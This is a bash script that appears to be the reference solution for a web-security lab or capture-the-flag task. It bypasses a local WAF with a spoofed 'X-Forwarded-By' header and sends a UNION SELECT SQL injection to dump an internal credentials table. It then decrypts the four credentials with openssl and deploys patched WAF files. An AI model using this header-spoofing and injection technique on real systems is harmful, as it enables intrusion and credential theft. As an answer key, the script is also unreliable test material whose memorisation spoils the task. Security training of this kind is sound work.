#!/bin/bash

cd /app

# Start the WAF query service
/app/start_service.sh
sleep 2

# Step 1: Verify WAF bypass works via HTTP using the trusted header
# The X-Forwarded-By header skips YAML rules; no Python rule blocks UNION SELECT
echo "[*] Testing header bypass + UNION SELECT via curl..."
RESPONSE=$(curl -s -X POST http://localhost:5000/query \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-By: internal-waf-proxy" \
    -d "{\"where\": \"1=0 UNION SELECT id, category, credential_blob, iv_hex, NULL FROM internal_credentials ORDER BY id\"}")

STATUS=$(echo "$RESPONSE" | jq -r '.status')
ROW_COUNT=$(echo "$RESPONSE" | jq '.rows | length')
echo "[*] HTTP bypass status: $STATUS, rows extracted: $ROW_COUNT"

# Verify WAF log captured the request
echo "[*] Checking WAF JSON logs..."
jq -r 'select(.allowed == true) | "  Allowed: \(.raw_input[:80])..."' /var/log/waf/requests.jsonl 2>/dev/null | tail -3

# Step 2: Decrypt credentials using sqlite3 + openssl pipeline
echo "[*] Reading encryption metadata via sqlite3..."
SALT=$(sqlite3 /app/database.db "SELECT salt_value FROM encryption_metadata WHERE id=1")
ALGORITHM=$(sqlite3 /app/database.db "SELECT algorithm FROM encryption_metadata WHERE id=1")
echo "[*] Salt: $SALT | Algorithm: $ALGORITHM"

KEY_HEX=$(printf '%s' "$SALT" | openssl dgst -sha256 | awk '{print $NF}')
echo "[*] Derived AES key: ${KEY_HEX:0:16}..."

> /app/flags.txt
for i in 1 2 3 4; do
    BLOB=$(sqlite3 /app/database.db "SELECT credential_blob FROM internal_credentials WHERE id=$i")
    IV=$(sqlite3 /app/database.db "SELECT iv_hex FROM internal_credentials WHERE id=$i")
    PLAINTEXT=$(printf '%s' "$BLOB" | openssl enc -d -aes-256-cbc -a -A -K "$KEY_HEX" -iv "$IV" -nosalt)
    echo "$PLAINTEXT" >> /app/flags.txt
    echo "[*] Credential $i decrypted: $PLAINTEXT"
done

echo "[+] All 4 flags decrypted and written to /app/flags.txt"

# Step 3: Deploy patched WAF (fixes both YAML config and Python module)
cp /solution/waf_fixed.py /app/waf_patched.py
cp /solution/waf_rules_fixed.yaml /app/waf_rules_patched.yaml

echo "[+] Patched WAF files deployed"
